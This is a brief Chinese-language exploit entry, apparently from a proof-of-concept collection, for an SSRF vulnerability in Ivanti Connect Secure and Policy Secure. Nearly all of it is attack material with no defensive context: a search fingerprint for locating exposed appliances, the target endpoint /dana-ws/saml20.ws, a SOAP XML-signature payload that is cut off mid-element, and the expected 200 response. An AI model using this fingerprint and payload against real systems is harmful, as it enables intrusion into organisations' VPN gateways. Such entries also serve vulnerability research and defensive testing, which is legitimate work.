# IvantiConnectSecure和IvantiPolicySecureSSRF漏洞

- **系统**：IvantiConnectSecure　|　**类型**：SSRF　|　**CVE**：—
- **指纹**：`body="welcome.cgi?p=logo"`
- **请求**：`GET /dana-ws/saml20.ws HTTP/1.1`
- **关键头**：`Content-Type: text/xml`

**请求体 / payload**
```
<?xml version="1.0" encoding="UTF-8"?>
<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
<soap:Body>
<ds:Signature xmlns:ds="http://www.w3.org/2000/09/xmldsig#">
<ds:SignedInfo>
<ds:CanonicalizationMethod Algorithm="http://www.w3.org/2001/10/xml-exc-c14n#"/>
<ds:SignatureMethod Algorithm="http://www.w3.org/2000/09/xmldsig#rsa-sha1"/>
</ds:SignedInfo>
<ds:SignatureValue>qwerty</ds:SignatureValue>
<ds:KeyInfo xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xsi:schemaLocation="http://www.w3.org/2000/09/xmldsig#" xmlns:ds="http://www.w3.org/2000/09/xmldsig#">
<ds:Retriev…（脚本共 729 字，完整版见原文）
```
- **预期**：200　|　—